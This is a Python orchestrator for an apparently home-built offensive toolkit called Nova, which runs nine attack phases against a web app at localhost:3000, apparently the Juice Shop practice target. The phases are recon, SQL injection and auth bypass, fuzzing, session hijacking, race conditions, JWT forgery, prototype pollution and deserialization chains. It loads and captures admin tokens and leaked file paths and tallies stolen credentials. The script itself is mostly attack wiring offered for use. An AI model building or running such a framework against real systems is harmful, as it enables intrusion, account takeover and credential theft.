#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║   🦅 NOVA UNIFIED CORE v2.0 — INTELLIGENCE WIRED      ║
║   Loads tokens & paths, passes between all modules     ║
╚══════════════════════════════════════════════════════════╝
"""

import json, time, sys, os, re, base64, requests
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from nova_adaptive_brain import NovaAdaptiveBrain
from nova_exploit_synthesizer import NovaExploitSynthesizer
from nova_fuzzer_fix import NovaFuzzer
from nova_session_hijacker import NovaSessionHijacker
from nova_race_engine import NovaRaceEngine
from nova_jwt_forge import NovaJWTForge
from nova_proto_polluter import NovaProtoPolluter
from nova_deserialize_dropper import NovaDeserializeDropper
from nova_feedback_cortex import NovaFeedbackCortex


class NovaCore:
    def __init__(self, base_url="http://localhost:3000"):
        self.base_url = base_url
        self.start_time = None
        self.findings = {"critical": [], "high": [], "medium": [], "low": []}
        self.admin_token = self._load_token()
        self.leaked_paths = self._load_paths()
        self.mission_log = []

    def _load_token(self):
        try:
            with open("nova_extracted_token.json", "r") as f:
                data = json.load(f)
                token = data.get("token", "")
                if token:
                    print(f"  🔑 Loaded admin token: {token[:50]}...")
                    return token
        except:
            pass
        return None

    def _load_paths(self):
        try:
            with open("nova_leaked_paths.json", "r") as f:
                data = json.load(f)
                paths = data.get("leaked_paths", [])
                if paths:
                    print(f"  📁 Loaded {len(paths)} leaked file paths")
                    return paths
        except:
            pass
        return []

    def log(self, msg, level="INFO"):
        entry = f"[{datetime.now().strftime('%H:%M:%S')}] [{level}] {msg}"
        print(f"  {entry}")
        self.mission_log.append(entry)

    def add_finding(self, finding, severity="medium"):
        self.findings.setdefault(severity, []).append(finding)

    def phase_1_recon(self):
        print("\n" + "=" * 60)
        print("🟢 PHASE 1/9: RECONNAISSANCE")
        print("=" * 60)
        brain = NovaAdaptiveBrain(base_url=self.base_url)
        brain.map_attack_surface()
        self.log(f"Profiled {len(brain.application_map)} endpoints")
        return brain

    def phase_2_exploit(self):
        print("\n" + "=" * 60)
        print("🔴 PHASE 2/9: EXPLOITATION")
        print("=" * 60)
        synth = NovaExploitSynthesizer(base_url=self.base_url)
        targets = [
            {"endpoint": "/rest/products/search", "method": "GET", "params": ["q"], "sink": "sql_injection"},
            {"endpoint": "/rest/user/login", "method": "POST", "params": ["email", "password"], "sink": "auth_bypass"},
        ]
        for t in targets:
            synth.exploit_path(path=[t], sink_type=t["sink"], confidence="HIGH")

        for r in synth.results:
            if r.get("success") == True:
                ind = r.get("indicators_found", [])
                sev = "critical" if any(i in ind for i in ["password", "admin", "token"]) else "high"
                self.add_finding({"type": r.get("exploit_type", "unknown"), "endpoint": r.get("endpoint", ""), "payload": r.get("payload", ""), "data_exposed": ind}, sev)
                if "token" in ind or "authentication" in ind:
                    matches = re.findall(r'(eyJ[A-Za-z0-9\-._~+/]+=*)', r.get("response_preview", ""))
                    for tok in matches:
                        if len(tok) > 50 and not self.admin_token:
                            self.admin_token = tok
                            self.log(f"Token captured from exploit: {tok[:40]}...")
        self.log(f"Exploits: {len([r for r in synth.results if r.get('success')])} successful")
        return synth

    def phase_3_fuzz(self):
        print("\n" + "=" * 60)
        print("🟡 PHASE 3/9: FUZZING")
        print("=" * 60)
        fuzzer = NovaFuzzer(base_url=self.base_url)
        report = fuzzer.fuzz_targets([
            {"endpoint": "/rest/products/search", "params": ["q"], "fuzz_types": ["sql_injection", "xss"]},
            {"endpoint": "/rest/user/login", "method": "POST", "params": ["email", "password"], "fuzz_types": ["sql_injection"]},
            {"endpoint": "/api/Feedbacks", "method": "POST", "params": ["comment"], "fuzz_types": ["xss", "sql_injection"]},
        ], intensity="low")
        self.log(f"Anomalies: {report.get('anomalies_found', 0)}")
        if report.get("critical", 0) > 0:
            self.add_finding({"type": "fuzzer_anomalies", "critical": report["critical"]}, "high")
        return fuzzer

    def phase_4_hijack(self):
        print("\n" + "=" * 60)
        print("🟣 PHASE 4/9: SESSION HIJACKING")
        print("=" * 60)
        hijacker = NovaSessionHijacker(base_url=self.base_url)
        report = hijacker.run_full_hijack(initial_token=self.admin_token)
        if report.get("fixation_results"):
            for r in report["fixation_results"]:
                if r.get("success"):
                    self.add_finding({"type": "session_fixation", "endpoint": r.get("endpoint", "")}, "medium")
        self.log(f"Fixation: {len([r for r in report.get('fixation_results', []) if r.get('success')])} successful")
        return hijacker

    def phase_5_race(self):
        print("\n" + "=" * 60)
        print("🟠 PHASE 5/9: RACE CONDITIONS")
        print("=" * 60)
        racer = NovaRaceEngine(base_url=self.base_url)
        report = racer.run_full_race_suite(auth_token=self.admin_token)
        for a in report.get("attacks", []):
            if a.get("vulnerable"):
                self.add_finding({"type": a.get("attack_type", "race"), "detail": a}, "high" if a.get("attack_type") == "rate_limit_bypass" else "medium")
        self.log(f"Vulnerabilities: {report.get('vulnerable_count', 0)}")
        return racer

    def phase_6_jwt(self):
        print("\n" + "=" * 60)
        print("🔐 PHASE 6/9: JWT ATTACKS")
        print("=" * 60)
        if not self.admin_token:
            self.log("No JWT token. Skipping.", "WARN")
            return None
        print(f"  Using token: {self.admin_token[:60]}...")
        forge = NovaJWTForge(base_url=self.base_url)
        report = forge.run_full_forge(self.admin_token)
        if report.get("successful_forgeries"):
            self.add_finding({"type": "jwt_forgery", "count": len(report["successful_forgeries"])}, "critical")
        return forge

    def phase_7_proto(self):
        print("\n" + "=" * 60)
        print("☣️  PHASE 7/9: PROTOTYPE POLLUTION")
        print("=" * 60)
        polluter = NovaProtoPolluter(base_url=self.base_url)
        report = polluter.run_full_pollution_campaign()
        if report.get("successful_pollutions", 0) > 0:
            self.add_finding({"type": "prototype_pollution", "count": report["successful_pollutions"]}, "critical")
        self.log(f"Attempts: {report.get('total_attempts', 0)} | Success: {report.get('successful_pollutions', 0)}")
        return polluter

    def phase_8_deserialize(self):
        print("\n" + "=" * 60)
        print("💣 PHASE 8/9: DESERIALIZATION")
        print("=" * 60)
        dropper = NovaDeserializeDropper(base_url=self.base_url, leaked_paths=self.leaked_paths)
        report = dropper.run_dropper()
        if report.get("successful_chains"):
            self.add_finding({"type": "deserialization", "chains": report["successful_chains"]}, "critical")
        self.log(f"Gadget chains: {len(report.get('successful_chains', []))} successful")
        return dropper

    def phase_9_learn(self):
        print("\n" + "=" * 60)
        print("🧠 PHASE 9/9: LEARNING")
        print("=" * 60)
        cortex = NovaFeedbackCortex(base_url=self.base_url)
        report = cortex.process_results([])
        self.log(f"Credentials extracted: {report.get('total_stolen_credentials', 0)}")
        return cortex

    def run_full_mission(self):
        self.start_time = time.time()
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║   🦅  NOVA UNIFIED CORE v2.0 — FULL MISSION  🦅           ║
║   9 Modules  •  Token: {'YES' if self.admin_token else 'NO':<3}  •  Paths: {len(self.leaked_paths):<3}                ║
╚══════════════════════════════════════════════════════════════╝""")

        try:
            self.phase_1_recon(); time.sleep(0.3)
            self.phase_2_exploit(); time.sleep(0.3)
            self.phase_3_fuzz(); time.sleep(0.3)
            self.phase_4_hijack(); time.sleep(0.3)
            self.phase_5_race(); time.sleep(0.3)
            self.phase_6_jwt(); time.sleep(0.3)
            self.phase_7_proto(); time.sleep(0.3)
            self.phase_8_deserialize(); time.sleep(0.3)
            self.phase_9_learn()
        except KeyboardInterrupt:
            self.log("Mission interrupted", "WARN")
        except Exception as e:
            self.log(f"Error: {str(e)[:200]}", "ERROR")

        elapsed = round(time.time() - self.start_time, 2)
        self._report(elapsed)

    def _report(self, elapsed):
        total = sum(len(v) for v in self.findings.values())
        print(f"""
╔══════════════════════════════════════════╗
║        MISSION STATISTICS               ║
╠══════════════════════════════════════════╣
║  Time: {elapsed:.1f}s  |  Modules: 9  |  Findings: {total:<3}  ║
║  Critical: {len(self.findings.get('critical', [])):<3}  High: {len(self.findings.get('high', [])):<3}  Med: {len(self.findings.get('medium', [])):<3}     ║
║  Token: {'✅' if self.admin_token else '❌':<3}  |  Paths: {len(self.leaked_paths):<3}               ║
╚══════════════════════════════════════════╝""")

        if self.findings["critical"]:
            print("🔥 CRITICAL:")
            for f in self.findings["critical"]:
                print(f"   💀 {f.get('type', '?')}: {str(f.get('endpoint', f.get('detail', '')))[:70]}")
        if self.findings["high"]:
            print("⚠️  HIGH:")
            for f in self.findings["high"]:
                print(f"   ⚡ {f.get('type', '?')}")

        report = {"timestamp": datetime.now().isoformat(), "target": self.base_url,
                  "duration": elapsed, "findings": self.findings, "total": total,
                  "token_captured": bool(self.admin_token), "paths_leaked": len(self.leaked_paths),
                  "mission_log": self.mission_log}
        with open("nova_unified_mission_report.json", "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(f"\n📁 Report: nova_unified_mission_report.json")
        print(f"🦅 Nova v2.0 Mission Complete. {total} findings in {elapsed}s.")


if __name__ == "__main__":
    NovaCore().run_full_mission()
